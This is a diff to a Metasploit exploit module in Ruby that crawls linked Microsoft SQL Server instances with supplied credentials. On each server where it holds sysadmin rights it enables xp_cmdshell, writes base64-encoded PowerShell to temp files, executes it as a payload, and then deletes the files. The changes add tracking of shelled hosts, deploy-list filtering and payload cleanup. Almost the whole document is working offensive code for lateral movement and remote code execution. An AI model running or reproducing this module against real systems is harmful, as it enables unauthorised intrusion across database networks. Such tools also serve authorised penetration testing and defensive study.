@@ -48,7 +48,7 @@ class Metasploit3 < Msf::Exploit::Remote
 		print_status("-------------------------------------------------")		
 		
 		# Check if credentials are correct
-		print_status("Attempting to connect to SQL Server at #{rhost}...")
+		print_status("Attempting to connect to SQL Server at #{rhost}:#{rport}...")
 		
 		if (not mssql_login_datastore)
 			print_error("Invalid SQL Server credentials")
@@ -66,48 +66,12 @@ class Metasploit3 < Msf::Exploit::Remote
 		masterList[0]["db_version"] = ""	# Database version of the linked database server
 		masterList[0]["db_os"] = ""			# OS of the linked database server
 		masterList[0]["path"] = [[]]		# Link path used during crawl - all possible link paths stored
-		masterList[0]["done"] = 0			# Used to determine if linked need to be crawled	
+		masterList[0]["done"] = 0			# Used to determine if linked need to be crawled
+		
+		shelled = Array.new					# keeping track of shelled systems - multiple incoming sa links could result in multiple shells on one system
 		
 		# Setup query for gathering information from database servers
 		versionQuery = "select @@servername,system_user,is_srvrolemember('sysadmin'),(REPLACE(REPLACE(REPLACE(ltrim((select REPLACE((Left(@@Version,CHARINDEX('-',@@version)-1)),'Microsoft','')+ rtrim(CONVERT(char(30), SERVERPROPERTY('Edition'))) +' '+ RTRIM(CONVERT(char(20), SERVERPROPERTY('ProductLevel')))+ CHAR(10))), CHAR(10), ''), CHAR(13), ''), CHAR(9), '')) as version, RIGHT(@@version, LEN(@@version)- 3 -charindex (' ON ',@@VERSION)) as osver,is_srvrolemember('sysadmin'),(select count(srvname) from master..sysservers where dataaccess=1 and srvname!=@@servername and srvproduct = 'SQL Server')as linkcount"
-		
-		# Run initial query against database entry point 		
-		result = mssql_query(versionQuery, false) if mssql_login_datastore
-		column_data = result[:rows]
-		
-		# Populate master list with entry pooint information to start the db link crawl
-		column_data.each { |s|
-			print_status("Successfully connected to #{rhost} (#{s[0]})")
-			masterList[0]["name"] = s[0]
-			masterList[0]["db_user"] = s[1]
-			masterList[0]["db_sysadmin"] = s[5]
-			masterList[0]["db_version"] =  s[3]
-			masterList[0]["db_os"] = s[4]	
-			masterList[0]["numlinks"] = s[6]
-			
-			# Translate syadmin code
-			status = masterList[0]["db_sysadmin"]
-			if status == 1 then
-				dbpriv = "sysadmin"		
-			else
-				dbpriv = "user"			
-			end
-			
-			# Display database entry point configuration
-			print_status(" ") if datastore['VERBOSE'] == true
-			print_status("  o Server: #{s[0]}") if datastore['VERBOSE'] == true
-			print_status("  o User: #{masterList[0]["db_user"]}")	 if datastore['VERBOSE'] == true								
-			print_status("  o Privs: #{dbpriv}")	if datastore['VERBOSE'] == true							
-			print_status("  o Version: #{masterList[0]["db_version"]}") if datastore['VERBOSE'] == true							
-			print_status("  o OS: #{masterList[0]["db_os"].strip}") if datastore['VERBOSE'] == true
-			print_status("  o Links on server: #{masterList[0]["numlinks"]}") if datastore['VERBOSE'] == true
-			print_status(" ") if datastore['VERBOSE'] == true
-			
-			# Attempt to deliver a payload to database entry point - ???
-			if masterList[0]["db_sysadmin"] == 1 then
-				enable_xp_cmdshell([])
-			end
-		}	
 		
 		# Create loot table to store configuration information from crawled database server links
 		linked_server_table = Rex::Ui::Text::Table.new(
@@ -118,134 +82,121 @@ class Metasploit3 < Msf::Exploit::Remote
 		save_loot = ""
 
 		# Start crawling through linked database servers
-		while masterList.any? {|f| f["done"] == 0}	
-			
+		while masterList.any? {|f| f["done"] == 0}
 			# Find the first DB server that has not been crawled (not marked as done)
 			server = masterList.detect {|f| f["done"] == 0}
 			
-			# Select a list of the linked database servers that exist on the current database server
-			sql = query_builder(server["path"].first,"",0,"select srvname from master..sysservers where dataaccess=1 and srvname!=@@servername and srvproduct = 'SQL Server'") 
+			# Get configuration information from the database server
+			sql = query_builder(server["path"].first,"",0,versionQuery)
 			result = mssql_query(sql, false) if mssql_login_datastore
-		    print_status("-------------------------------------------------")
-			print_status("Crawling links on #{server["name"]}...")	
-			print_status("-------------------------------------------------")
-			
-			# Setup number of db server links
-			if server["numlinks"] != nil then
-				mynumlinks = server["numlinks"]
-			else
-				mynumlinks = masterList[0]["numlinks"]
+			parse_results = result[:rows]
+			parse_results.each { |s|
+				server["name"] = s[0]
+				server["db_user"] = s[1]
+				server["db_sysadmin"] = s[5]
+				server["db_version"] =  s[3]
+				server["db_os"] = s[4]
+				server["numlinks"] = s[6]
+			}
+			if masterList.length == 1
+				print_good("Successfully connected to #{server["name"]}")
+				if datastore['VERBOSE'] == true
+					show_configs(server["name"],parse_results,true)
+				elsif server["db_sysadmin"] == 1
+					print_good("Sysadmin on #{server["name"]}")
+				end
 			end
-			
-			# Display number db server links 
-			print_status("  Links found: #{mynumlinks}")
+			if server["db_sysadmin"] == 1
+				enable_xp_cmdshell(server["path"].first,server["name"],shelled)
+			end
 						
 			# If links were found, determine if they can be connected to and add to crawl list
-			if (result[:done][:rows] > 0)
+			if (server["numlinks"] > 0)
 				# Enable loot
 				save_loot = "yes"
 				
-				result[:rows].each {|i|
-					i.each {|i|											
+				# Select a list of the linked database servers that exist on the current database server
+				print_status("")
+				print_status("-------------------------------------------------")
+				print_status("Crawling links on #{server["name"]}...")
+				# Display number db server links 
+				print_status("Links found: #{server["numlinks"]}")				
+				print_status("-------------------------------------------------")
+				execute = "select srvname from master..sysservers where dataaccess=1 and srvname!=@@servername and srvproduct = 'SQL Server'"
+				sql = query_builder(server["path"].first,"",0,execute) 
+				result = mssql_query(sql, false) if mssql_login_datastore
+				
+				result[:rows].each {|name|
+					name.each {|name|											
 					
-						# Check if link works and if sysadmin permissions - temp array to save orig server[path] - ???
+						# Check if link works and if sysadmin permissions - temp array to save orig server[path]
 						temppath = Array.new
-						server["path"].first.each {|j| temppath << j}
-						temppath << i
+						temppath = server["path"].first.dup
+						temppath << name
 
 						# Get configuration information from the linked server
 						sql = query_builder(temppath,"",0,versionQuery)
-						result = mssql_query(sql, false) if mssql_login_datastore	
+						result = mssql_query(sql, false) if mssql_login_datastore
 						
 						# Add newly aquired db servers to the masterlist, but don't add them if the link is broken or already exists					
-						if result[:errors].empty? and result[:rows] != nil then
-																
-								# Assign db query results to variables for hash
-								parse_results = result[:rows]								
-								
-								# Add link server information to loot
-								link_status = 'up'
-								write_to_report(i,server,parse_results,linked_server_table,link_status)
-								
-								# Display link server information in verbose mode
-								show_configs(i,parse_results) if datastore['VERBOSE'] == true
-									
-								# Add link to masterlist hash
-								masterList << add_host(i,server["path"].first,parse_results) unless masterList.any? {|f| f["name"] == i}										
-								# Set current link target
-								current_link = parse_results[0][0]
-								
-								# Set db_sysadmin status						
-								db_sysadmin = parse_results[0][5]
-															
-								# Check if the user the link is configured with has sysadmin privileges
-								if db_sysadmin == 1 
-										
-									# Display status to the user	
-									if datastore['VERBOSE'] == true
-										print_good("  o Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")}")
+						if result[:errors].empty? and result[:rows] != nil then										
+							# Assign db query results to variables for hash
+							parse_results = result[:rows]								
+							
+							# Add link server information to loot
+							link_status = 'up'
+							write_to_report(name,server,parse_results,linked_server_table,link_status)
+							
+							# Display link server information in verbose mode
+							if datastore['VERBOSE'] == true
+								show_configs(name,parse_results) 
+								print_status("  o Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")}")
+							else
+								if parse_results[0][5] == 1
+									print_good("Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")} (Sysadmin!)")
+								else
+									print_status("Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")}")
+								end
+							end
+							
+							# Add link to masterlist hash
+							unless masterList.any? {|f| f["name"] == name}
+								masterList << add_host(name,server["path"].first,parse_results)
+							else
+								(0..masterList.length-1).each do |x|
+									if masterList[x]["name"] == name
+										masterList[x]["path"] << server["path"].first.dup
+										masterList[x]["path"].last << name
+										unless shelled.include?(name)
+											if parse_results[0][2]==1
+												enable_xp_cmdshell(masterList[x]["path"].last.dup,name,shelled)
+											end
+										end
 									else
-										print_good("  o Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")} (Sysadmin!)")
+										break
 									end
-									
-									# Deploy payload if deploy is set to true
-									if datastore['DEPLOY'] == true
-									
-										# Unset deploylist if blank
-										if datastore['DEPLOYLIST']=="" then
-											datastore['DEPLOYLIST'] = nil 
-										end 
-										
-										# Display status to user
-										if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true then
-											print_status("\t - Checking if #{current_link} is on the deploy list...") 
-										end
-										
-										# Convert deploy list into array for validation check
-										deploylist = datastore['DEPLOYLIST'].upcase.split(',') if datastore['DEPLOYLIST'] != nil
-											
-										# Check if db server is in deploylist;if so then deploy payload	
-										if datastore['DEPLOYLIST'] == nil or deploylist.include? current_link.upcase
-											
-											# Display validation check status 
-											if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true then
-												print_status("\t - #{current_link} is on the deploy list.") 
-											end
-											
-											# Attempt to deploy payload
-											enable_xp_cmdshell(temppath)
-										else
-										
-											# Display validation check status 
-											if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true then
-												print_status("\t - #{current_link} is NOT on the deploy list.") 
-											end
-										end
-									end
-
-								else								    
-									print_status("  o Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")}")	and datastore["VERBOSE"] == true
-									
-								end								
+								end
+							end	
 						else
-						
 							# Add to report
-							linked_server_table << [server["name"],server["db_version"],server["db_os"],i,'NA','NA','NA','NA','Connection Failed'] 
+							linked_server_table << [server["name"],server["db_version"],server["db_os"],name,'NA','NA','NA','NA','Connection Failed'] 
 			
 							# Display status to user
-							print_status(" ") if datastore['VERBOSE'] == true
-							print_error("Linked Server: #{i} ") if datastore['VERBOSE'] == true
-							print_error("  o Link Path: #{masterList.first["name"]} -> #{temppath.join(" -> ")} - Connection Failed")
-							print_status("    Failure could be due to:") if datastore['VERBOSE'] == true
-							print_status("    - A dead server") if datastore['VERBOSE'] == true
-							print_status("    - Bad credentials") if datastore['VERBOSE'] == true
-							print_status("    - Nested open queries through SQL 2000") if datastore['VERBOSE'] == true
-
+							if datastore['VERBOSE'] == true
+								print_status(" ") 
+								print_error("Linked Server: #{name} ")
+								print_error("  o Link Path: #{masterList.first["name"]} -> #{temppath.join(" -> ")} - Connection Failed")
+								print_status("    Failure could be due to:")
+								print_status("    - A dead server")
+								print_status("    - Bad credentials")
+								print_status("    - Nested open queries through SQL 2000")
+							else
+								print_error("Link Path: #{masterList.first["name"]} -> #{temppath.join(" -> ")} - Connection Failed")
+							end
 						end
 					}
 				}
 			end
-			
 			# Set server to "crawled"
 			server["done"]=1						
 		end
@@ -274,7 +225,6 @@ class Metasploit3 < Msf::Exploit::Remote
 			path = store_loot("crawled_links", "text/plain", datastore['RHOST'], linked_server_table.to_csv, filename, "Linked servers",this_service)
 			print_status("Results have been saved to: #{path}")
 		end		
-
     end
 		
 		
@@ -347,10 +297,9 @@ class Metasploit3 < Msf::Exploit::Remote
 	# ---------------------------------------------------------------------
 	# Method to display configuration information
 	# ---------------------------------------------------------------------
-	def show_configs(i,parse_results)
+	def show_configs(i,parse_results,entry=false)
 			
 		print_status(" ")
-		print_status("Linked Server: #{i}")
 		parse_results.each {|stuff|  
 			
 			# Translate syadmin code
@@ -362,14 +311,23 @@ class Metasploit3 < Msf::Exploit::Remote
 			end
 		
 			# Display database link information
-			print_status("  o Link user: #{stuff.at(1)}")	 								
-			print_status("  o Link privs: #{dbpriv}")				
-			print_status("  o Link version: #{stuff.at(3)}") 			
-			print_status("  o Link OS: #{stuff.at(4).strip}") 
-			print_status("  o Links on server: #{stuff.at(6)}") 	
+			if entry == false
+				print_status("Linked Server: #{i}")
+				print_status("  o Link user: #{stuff.at(1)}")	 								
+				print_status("  o Link privs: #{dbpriv}")				
+				print_status("  o Link version: #{stuff.at(3)}") 			
+				print_status("  o Link OS: #{stuff.at(4).strip}") 
+				print_status("  o Links on server: #{stuff.at(6)}")
+			else
+				print_status("Server: #{i}")
+				print_status("  o Server user: #{stuff.at(1)}")
+				print_status("  o Server privs: #{dbpriv}")
+				print_status("  o Server version: #{stuff.at(3)}")
+				print_status("  o Server OS: #{stuff.at(4).strip}")
+				print_status("  o Server on server: #{stuff.at(6)}")
+			end
 		}		
 	end
-	
 	
 	# ---------------------------------------------------------------------
 	# Method for generating the report and loot
@@ -394,11 +352,7 @@ class Metasploit3 < Msf::Exploit::Remote
 	# ---------------------------------------------------------------------
 	# Method for enabling xp_cmdshell
 	# ---------------------------------------------------------------------
-	def enable_xp_cmdshell(path)
-	
-		# Check if its the entry point
-		puts "blah: #{path.inspect}"
-		
+	def enable_xp_cmdshell(path,name,shelled)
 		# Enables "show advanced options" and xp_cmdshell if needed and possible
 		# They cannot be enabled in user transactions (i.e. via openquery)
 		# Only enabled if RPC_Out is enabled for linked server
@@ -442,15 +396,39 @@ class Metasploit3 < Msf::Exploit::Remote
 		xpcmdNow = result[:rows].pop.pop
 		
 		if xpcmdNow == 1 or xpcmdOrig == 1
-			print_status("\t - Enabled xp_cmdshell on " + path.last) if xpcmdOrig == 0		
-			powershell_upload_exec(path)			
+			print_status("\t - Enabled xp_cmdshell on " + path.last) if xpcmdOrig == 0
+			if datastore['DEPLOY']
+				print_status("Ready to deploy a payload #{name}")
+				if datastore['DEPLOYLIST']==""
+					datastore['DEPLOYLIST'] = nil
+				end
+				if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true
+					print_status("\t - Checking if #{name} is on the deploy list...")
+				end
+				if datastore['DEPLOYLIST'] != nil
+					deploylist = datastore['DEPLOYLIST'].upcase.split(',')
+				end
+				if datastore['DEPLOYLIST'] == nil or deploylist.include? name.upcase
+					if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true
+						print_status("\t - #{name} is on the deploy list.")
+					end
+					unless shelled.include?(name)
+						powershell_upload_exec(path)
+						shelled << name
+					else
+						print_status("Payload already deployed on #{name}")
+					end
+				elsif datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true
+					print_status("\t - #{name} is not on the deploy list")
+				end
+			end
 		else
 			print_error("\t - Unable to enable xp_cmdshell on " + path.last)
 		end
 		
 		# Revert soa and xp_cmdshell to original state
 		if xpcmdOrig == 0 and xpcmdNow == 1
-			print_status("Disabling xp_cmdshell on " + path.last)
+			print_status("\t - Disabling xp_cmdshell on " + path.last)
 			execute = "sp_configure 'xp_cmdshell',0;reconfigure"
 			sql = query_builder_rpc(path,"",0,execute)
 			result = mssql_query(sql, false) if mssql_login_datastore
@@ -499,19 +477,15 @@ $winFunc::CreateThread(0,0,$x,0,0,0)"
 		# This is written 2500 characters at a time due to xp_cmdshell ruby function limitations	
 		# Also, line number tracking was added so that duplication lines causes by nested linked
         # queries could be found and removed.		
+		print_status("Deploying payload...")
 		linenum = 0 
-		print_status("\t - Writing base64 powershell temp files to %TEMP%\\#{rand_filename} and %TEMP%\\#{var_duplicates}...")
 		mytext_64.scan(/.{1,2500}/).each {|part| 
 			execute = "select 1; EXEC master..xp_cmdshell 'powershell -C \"Write \"--#{linenum}--#{part}\" >> %TEMP%\\#{rand_filename}\"'"			
 			sql = query_builder(path,"",0,execute)
 			result = mssql_query(sql, false) if mssql_login_datastore
 			linenum = linenum+1			
 		}
-		
-		# Display status to user
-		print_status("\t - Finished writing %TEMP%\\#{rand_filename}.") if datastore['VERBOSE'] == true
-		print_status("\t - Removing duplicate lines from %TEMP%\\#{rand_filename}...") if datastore['VERBOSE'] == true
-		
+	
 		# Remove duplicate lines from temp file and write to new file		
 		execute = "select 1;exec master..xp_cmdshell 'powershell -C \"gc %TEMP%\\#{rand_filename}| get-unique > %TEMP%\\#{var_duplicates}\"'"
 		sql = query_builder(path,"",0,execute)
@@ -522,9 +496,6 @@ $winFunc::CreateThread(0,0,$x,0,0,0)"
 		sql = query_builder(path,"",0,execute)
 		result = mssql_query(sql, false) if mssql_login_datastore
 		
-		# Status user
-		print_status("\t - Finished removing duplicates in %TEMP%\\#{rand_filename}.") if datastore['VERBOSE'] == true
-		
 		# Used base64 encoded powershell command so that we could use -noexit and avoid parsing errors
 		# If running on 64bit system, 32bit powershell called from syswow64
 		powershell_cmd =  "$temppath=(gci env:temp).value;$dacode=(gc $temppath\\#{rand_filename}) -join '';if((gci env:processor_identifier).value -like '*64*'){$psbits=\"C:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -noprofile -encodedCommand $dacode\"} else {$psbits=\"powershell.exe -noexit -noprofile -encodedCommand $dacode\"};iex $psbits"
@@ -534,17 +505,14 @@ $winFunc::CreateThread(0,0,$x,0,0,0)"
 		# Setup query 
 		execute = "select 1; EXEC master..xp_cmdshell 'powershell -EncodedCommand #{powershell_64}'"
 		sql = query_builder(path,"",0,execute)
+
 		
 		# Execute the playload
-		print_status("\t - Executing payload...")
+		print_status("Executing payload...")
 		result = mssql_query(sql, false) if mssql_login_datastore 	 
-		
 		# Remove payload data from the target server
-		print_status("\t - Removing %TEMP%\\#{rand_filename} and %TEMP%\\#{var_duplicates}...") if datastore['VERBOSE'] == true
-#		execute = "select 1; EXEC master..xp_cmdshell 'cmd /c del %TEMP%\\#{rand_filename} %TEMP%\\#{var_duplicates}'"
-#		sql = query_builder(path,"",0,execute)
-#		result = mssql_query(sql,false)
-		print_status("\t - Removed temp files %TEMP%\\#{rand_filename} and %TEMP%\\#{var_duplicates}.")
-	
+		execute = "select 1; EXEC master..xp_cmdshell 'powershell -C \"Remove-Item %TEMP%\\#{rand_filename}\";powershell -C \"Remove-Item %TEMP%\\#{var_duplicates}\"'"
+		sql = query_builder(path,"",0,execute)
+		result = mssql_query(sql,false)
 	end
 end
